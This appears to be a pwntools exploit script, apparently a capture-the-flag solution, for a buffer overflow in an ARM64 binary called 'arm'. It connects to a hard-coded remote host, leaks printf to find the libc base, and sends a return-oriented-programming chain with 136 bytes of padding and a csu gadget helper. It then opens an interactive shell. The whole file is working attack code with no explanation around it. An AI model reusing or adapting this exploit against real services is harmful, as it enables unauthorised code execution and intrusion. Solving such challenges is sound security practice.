#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./arm')

host = args.HOST or '172.104.14.64'
port = int(args.PORT or 54732)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())
def csu_rop(call, x0, x1, x2):
    payload = flat(0x0000000000400754, b'A'*8, 0x0000000000400730, 0, call)
    payload += flat(x0, x1, x2)
    payload += b'B'*8
    return payload
# -- Exploit goes here --
libc = ELF("./libc.so.6")
io = start()
io.recvuntil(" at ")
libc.address = int(io.recvline().strip(b"\n"), 16) - libc.sym['printf']
print(hex(libc.address))
# sh = libc.search('/bin/sh\x00').next()
# print(hex(sh))
bss = 0x4102f8
rop1 = flat([

    b"A"*136,
    0x400754,
    b"A" * 24 + p64(libc.address + 0x3d6d8) + p64(0xcafebabe),
    bss,
    b"A"*8,
    b"B"*8,
    b"C"*8,
    b"D"*8,
    b"E"*8,

])
rop1 = flat([

    b"A"*136,
    0x400754,
    b"A" * 24 + p64(libc.address + 0x3d6d8) + p64(0xcafebabe),
    bss,
    0x0,
    0x0,
    0x0,
    0x0,
    0x0

])
pause()
# rop1 = flat([

#     b"A"*136,
#     0xdeadbeef

# ])

io.sendlineafter("> ", rop1)
io.interactive()

